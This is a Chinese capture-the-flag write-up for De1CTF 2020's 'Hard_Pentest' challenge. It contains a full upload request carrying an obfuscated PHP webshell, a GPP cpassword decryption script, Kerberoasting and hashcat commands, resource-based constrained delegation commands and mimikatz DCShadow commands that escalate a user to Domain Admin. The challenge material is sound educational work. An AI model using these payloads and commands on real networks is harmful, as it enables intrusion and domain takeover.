# Hard_Pentest

上传

```
POST /index.php HTTP/1.1
Host: 47.113.219.76
Content-Length: 1918
Cache-Control: max-age=0
Origin: http://47.113.219.76
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyE7meGVYt90amEfD
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://47.113.219.76/
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryyE7meGVYt90amEfD
Content-Disposition: form-data; name="file"; filename="1.php::$DATA"
Content-Type: text/plain

<?=$_=[]?><?=$_=@"$_"?><?=$_=$_['!'=='@']?><?=$__=$_?>
<?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$___ =$__?>
<?=$____=$___?>
<?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?>
<?=$___.=$__.$___?>
<?=$__=$_?>
<?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?>
<?=$___.=$__?>
<?=$__=$_?>
<?=$__++?><?=$__++?><?=$__++?><?=$__++?>
<?=$___.=$__?>
<?=$__=$_?>
<?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?>
<?=$___.=$__?>
<?=$____='_'?>
<?=$__=$_?>
<?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?>
<?=$____.=$__?>
<?=$__=$_?>
<?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?>
<?=$____.=$__?>
<?=$__=$_?>
<?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?>
<?=$____.=$__?>
<?=$__=$_?>
<?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?>
<?=$____.=$__?>
<?=$_=$$____?>
<?=$___($_[_])?>

------WebKitFormBoundaryyE7meGVYt90amEfD
Content-Disposition: form-data; name="submit"

submit
------WebKitFormBoundaryyE7meGVYt90amEfD--
```

得到webshell后，发现flag不在web服务器上，猜测应该是内网渗透，为了方便操作可以弹个`meterpreter`或者`beacon`回来。然后下一步就是内网渗透了，简单信息收集一下，发现域控共享文件夹Hint有一个压缩包`flag1_and_flag2hint.zip`

![1.png](https://i.loli.net/2020/05/05/VCn4FW2amxzYbpw.png)

将其下载下来，发现压缩包需要密码，继续信息收集，发现有一个用户`HintZip_Pass`，猜测压缩密码应该是从这个用户下手。

![2.png](https://i.loli.net/2020/05/05/vPFWmMsaQSrzNVn.png)

然后收集`Zip_Password`用户的一些信息，发现这个用户是属于`Zip_Password`这个OU的，而不是常规的Users容器

![3.png](https://i.loli.net/2020/05/05/C7cJ9afkQuGbM1m.png)

发现这个OU有一个`gplink`

![4.png](https://i.loli.net/2020/05/05/F2w5M9LPtsrzfnu.png)

然后对这个GPO进行信息收集，发现

![6.png](https://i.loli.net/2020/05/05/bPR6IZ7mpBNk14Q.png)

然后用`Get-GPPPassword.ps1`即可得到压缩包密码

![5.png](https://i.loli.net/2020/05/05/KUwZt3nkrH8SgpR.png)

或者写一个脚本将`cpassword`解密也可以

```python
import sys
from Crypto.Cipher import AES
from base64 import b64decode

key = "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b".decode('hex')
cpassword = "uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08"
cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
password = b64decode(cpassword)
plain = AES.new(key, AES.MODE_CBC, "\x00" * 16)
plain = plain.decrypt(password)
print plain[:-ord(plain[-1])].decode('utf16')
```

解压之后即可得到flag1，以及flag2的一些hint

```
flag1: De1CTF{GpP_11Is_SoOOO_Ea3333y}

Get flag2 Hint:
hint1: You need De1ta user to get flag2
hint2: De1ta user's password length is 1-8, and the password is composed of [0-9a-f].
hint3: Pay attention to the extended rights of De1ta user on the domain.
hint4: flag2 in Domain Controller (C:\Users\Administrator\Desktop\flag.txt)

PS: Please do not damage the environment after getting permission, thanks QAQ.
```

根据Hint，需要用户De1ta才能得到flag2，然后对De1ta用户进行信息收集，发现web用户对De1ta用户的`servicePrincipalName`属性具有写权限

![8.png](https://i.loli.net/2020/05/05/K8YJMgxf6SmNCbn.png)

根据Hint2猜测应该是通过web用户给De1ta设置spn然后通过`Kerberoasting`去暴力破解De1ta用户的密码。

尝试给De1ta用户设置spn

![9.png](https://i.loli.net/2020/05/05/bRzpTnIfJKluUkD.png)

然后`Kerberoasting`

![10.png](https://i.loli.net/2020/05/05/zs1ewu7xq256Fbd.png)

然后根据Hint2用hashcat离线爆破即可得到De1ta用户的密码

PS：这里也可以通过LDAP协议在线暴力破解，但是密码长度为`16^1 + 16^2 + 16^3 + 16^4 + 16^5 + 16^6 + 16^7 + 16^8 = 4581298448`，很显然在线暴力破解不现实。

```
hashcat64.exe -a 3 -m 13100 $krb5tgs$23$*USER$DOMAIN$test/test*$64EC0B10760E27F6EF4811DA3478C56D$77696AF42F593CF24D6B62D3DFEEF4AF8451E912AEC808B81BB2A833059EF7B0E9B41695D572B73917814E2439581239D264F4EF8ED6FC4DBC8DF5EA7D1F5CAD0B3197BFC16798C8EF2546B6DE4504D0F1C007EEA3222E948A448D818BDC8E4C26BBE2FD5D321BB0E2B0C6985383D9BA2E83E6389B4043E6CD04F2715C3159B7374DB32B817B4B3B04537CFDACD6FF54911F076EED74F820AF85D17FF93081775828E70DCD4489819EB6C6D518CF0C10F498B9A96EAA9CA330E8CE81C02D795572991D8979E39A6C633E849FCBC2831943F067320E41BF4FB0A9B8EB2EEC4CDD91606BDA4DF32A8BB4869D2CD424D9A156943D20E91F08C6EFA65B7C7AFC41309BCDA965E95D81318E47044D9333012914BBF27B1A48FC55BF8494DD65F317CAFA22F42F290335161ACE544841C196EBC239EE99A7F31C215119421390FAD8F16AAC63A7F83066B4CC5FB6AB89C61691E9202B447A4E920AF42A641133753AD5CF51580FBBAE080EBBAF589A1DF1E9543288A18116A0E191261149E63B88874BA607B3E4517EF84F3BA9B18255B58B3FF2C8570DCABC12F4FC0DA49AE61A92E8AF3C0ECD746BFF591743EFBC438E15CC645ECA3BFD935649168367287DD4E8029FC4454FAE237E8048FA701F8901EC9B4B5372E6B85802AB8A26F233D583F79F49CBAC378838E3C05AB2C2065C35A6C5D8B0B92D7F438E80BF3A1D847DC174BB0D370EB09125D710243001A9D988E350B43D556AEE8F09053790AAAFC395292EE2FAD3B7A04EB330AB90D2EAE29D9D922F0BB65ED2FF05A9A73B09001F5AECE1BC7162DE480F5463C7B19932B50DFA0329CDF0F964EFC0647FB7319408B541587D6AF2730EC52243E7A7BAB096AFB1FA6E7A81A7148347B43394BC3E280062105C1A6859F278C829E3BBAC3FD4F545154657BC4E0F55AF439140B3B1D29EE4209B8F83E3E3DDC52A6C32E92EB2836F80AF972B54D029D8EC071BD12BDCA45DBDF555A64B16AEC90CC486159D07D53A9D9196E5A736F48350F5639F482B45E7BA3EC11A9B7CA4DD8BC6320058CA0D891F5B4B1BFE0243E8D9640380492B0BEFB9EC13B8A4B2DE4297C3DE84FDB2753693F5E9FFB46FC1F60748AF1A07DE60F7656DBEDB927E3DF35B1AE8588BA6450C8D7539F982385D1B8AC25B37638EF9414519F37773A353EBBAAF996DF17DDE3CBF64B9ACFBEF65E12773004BDF5B6B81CC8CF5D2B59C6A2AAA883B458676AD2800710FA3F017C2E53B353D4E2C6B0D92D57B79939D29FAA8049F6CF0782E2572ACE8E8FFDFE1A05AC277924D4826606F5C68369C15186910DAEC601CA691910DCE519D58EDC964D5844FE8B7B21F9F99C6891FAE7DC0D783EA78EF6393A92F273D98353718670BA167A9CC9809B03195EDA8323B7C887040CD37FF4A09 -1 0123456789abcdef --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1
```

![11.png](https://i.loli.net/2020/05/05/1FcBuURiYK9NwVH.png)

根据Hint3：注意De1ta在域上的拓展权限，然后对域的ACL进行信息收集

![12.png](https://i.loli.net/2020/05/05/GFscQ52ryqzDbVH.png)

发现De1ta用户在域上有`Add/Remove Replica In Domain`、`Replication Synchronization`、`Manage Replication Topology`权限，这很容易想到Dcshadow，但是单单三个权限还是不满足Dcshadow的条件的，还要对当前主机属性具有写权限以及对`CN=Sites,CN=Configuration,DC=De1CTF2020,DC=lab`容器具有`Create Child`和`Delete Chind`权限。然后再收集一波相关的ACL

发现De1ta用户对`CN=Sites,CN=Configuration,DC=De1CTF2020,DC=lab`容器具有`Create Child`和`Delete Chind`权限

![13.png](https://i.loli.net/2020/05/05/dcwhRPqpyLxbTrQ.png)

De1ta对当前主机DM属性具有写权限，刚好满足Dcshadow的所有权限

![14.png](https://i.loli.net/2020/05/05/9QMeEHbmWZOT4CL.png)

但是现在还有一个问题是，Dcshadow需要system权限去调用本地的RPC服务，上面说过De1ta对当前主机DM属性具有写权限，通过信息收集可以知道域控是`Windows Server 2012R2`

![38.png](https://i.loli.net/2020/05/05/tuUW5Tsv8akISbY.png)

所以我们可以通过基于资源的约束委派对当前主机进行本地提权。

申请一张De1ta用户的TGT，并导入当前会话

![27.png](https://i.loli.net/2020/05/05/3b6wdSU97xmQ8DK.png)

然后新建一个主机用户evilsystem，并配置evilsystem到DM基于资源的约束委派

```powershell
New-MachineAccount -MachineAccount evilsystem -Password $(ConvertTo-SecureString "evil" -AsPlainText -Force)

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1806179181-549835139-1294087714-1111)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer DM| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

![img](https://i.loli.net/2020/05/05/b7iMdkjF6ElXpKe.png)

配置完成后我们就可以通过s4u获得一个高权限的shell

```
.\getst.exe -dc-ip 192.168.0.12 -spn cifs/dm -impersonate Administrator de1ctf2020.lab/evilsystem:evil
$env:KRB5CCNAME="Administrator.ccache"
.\wmiexec.exe -no-pass -k dm shell.exe
```

PS：如果是msf的shell的话会出现如下情况，出现这个问题的原因应该是命名管道导致编码出现问题。

![29.png](https://i.loli.net/2020/05/05/S7ak14zgVlCu3dA.png)

所以这里使用cs，或者直接把内网穿透出来也是可以的

![30.png](https://i.loli.net/2020/05/05/rH5AzbohEUWfyqt.png)

执行之后就即可得到一个高权限的shell了

![img](https://i.loli.net/2020/05/05/tTIwNgMYdS2WCZK.png)

然后就是利用Dcshadow修改用户的属性，这里可以是修改SID-History为域管的SID或者是修改primaryGroupID改为域管组的primaryGroupID(512)都是可以的

```
mimikatz.exe  "!+" "!processtoken" "lsadump::dcshadow /object:de1ta /attribute:primaryGroupID /value:512"
```

![32.png](https://i.loli.net/2020/05/05/lvid7czZSfP3apE.png)

然后使用用户De1ta进行推送，触发域控间数据的同步

```
Rubeus.exe asktgt /user:de1ta /rc4:B03094996601324646AC223BF30D0D07 /domain:de1ctf2020.lab /ptt && mimikatz.exe "lsadump::dcshadow /push" "exit"
```

![36.png](https://i.loli.net/2020/05/05/IbnqfEOQMpAH2ho.png)

推送之后查看一下是否加入域管组

![35.png](https://i.loli.net/2020/05/05/YNK7qHQydiMglxB.png)

然后读取在域控上的flag即可

![37.png](https://i.loli.net/2020/05/05/vaGIPQfXKyEJl7r.png)

整个过程如下：

PS：有时候因为网络问题RPC那端可能会没有显示同步完成，这个属于正常现象，不影响把数据同步到域控上。

![9.gif](https://i.loli.net/2020/05/05/3LARC8ax2MBQJWY.gif)

## End

提一下，这道题有几个上车的点：
1. 如果是使用mimikatz.exe的`!processtoken`提升为system权限，会将当前进程的所有mimikatz、cmd都提升为system权限。
2. Dcshadow那步没有将权限还原，可能导致其它选手直接上车（有2、3个队就是上了这个车）。
3. 注册SPN那步没有将De1ta用户的SPN给删掉，可能导致其它选手直接`Kerberoasting`上车。

还有选手问的几个比较多的问题，我这里提一下：
1. 为什么De1ta的密码能用logonpasswords导出来
解：因为有人提权之后拿De1ta用户登陆了DM，所以在内存中缓存了密码
2. 为什么使用De1ta用户能直接登陆域控getflag
解：因为上一个队伍Dcshadow之后De1ta用户是高权限，并且没有及时清理掉权限
3. 为什么不用基于资源的约束委派也能提权
解：其实这里有两个非预期提权的，虽然最后这两个提权都修了，但是还是有一个队伍利用PrintSpoofer提权并且拿到了flag Orz，一个是土豆（修题：禁用DCOM），一个是PrintSpoofer（修题：禁用SeImpersonatePrivilege）。PrintSpoofer是我没想到，这个提权方法是比赛结束后我才在推特上看到的，提权方法是5.2公布的，比赛刚好是5.2，搞得修题跟应急似的
4. 为什么用Rebeus导入的票据使用不了
解：这个具体原因我也不是很清楚，但是用impacket是没有什么问题的

最后非常感谢各位师傅的认真做题没有给题目搅屎Orzzzzzzz